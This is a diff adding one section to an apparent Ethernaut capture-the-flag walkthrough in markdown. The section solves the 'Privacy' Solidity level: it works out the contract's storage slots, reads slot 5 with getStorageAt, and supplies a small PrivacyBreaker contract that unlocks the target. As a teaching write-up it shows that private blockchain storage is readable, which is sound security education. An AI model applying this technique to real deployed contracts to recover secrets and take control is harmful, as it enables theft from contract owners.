@@ -470,3 +470,63 @@ await myContract.goToLast();
 ```
 
 And we are done, [see the full code here](https://github.com/MCarlomagno/hackernaut/blob/main/contracts/Elevator.sol).
+
+---
+
+### 11. Privacy
+
+This level requires a better understanding about how Solidity optimizes storage slots storing deployed smart contracts data. We can figure out the hex value of each slot using:
+
+```js
+await web3.eth.getStorageAt(contract.address, slotNumber); // e.g slotNumber = 0 for first slot
+```
+
+Now to figure which slot contains the data[2] we must calculate the previous variable declaration and datatypes.
+
+```sol
+bool public locked = true;
+uint256 public ID = block.timestamp;
+uint8 private flattening = 10;
+uint8 private denomination = 255;
+uint16 private awkwardness = uint16(now);
+bytes32[3] private data;
+```
+
+1. Slot 0: Locked.
+2. Slot 1: ID.
+3. Slot 2: flattening + denomination + awkwardness.
+4. Slot 3: data[0].
+5. Slot 4: data[1].
+6. Slot 5: data[2]. -> Voilá!
+
+Now let's get that slot value:
+
+```js
+await web3.eth.getStorageAt(contract.address, 5);
+```
+
+Then with the hexadecimal result we can setup a contract and hack the password parsing the `bytes32` to `bytes16` array.
+
+> Note: It doesn't matters 'what' is this value, and what does it mean. We just know is the value we need to unlock the contract.
+
+```sol
+contract PrivacyBreaker {
+  bytes32 public data;
+  address public victim;
+
+  constructor(bytes32 _data, address _victim) {
+    data = _data;
+    victim = _victim;
+  }
+  
+  function hack() public {
+    Privacy(victim).unlock(bytes16(data));
+  }
+}
+```
+
+After setting up the contract sending the vicim's address and our hex 'key'. We just need to run the `hack()` function as follows:
+
+```js
+await myContact.hack();
+```
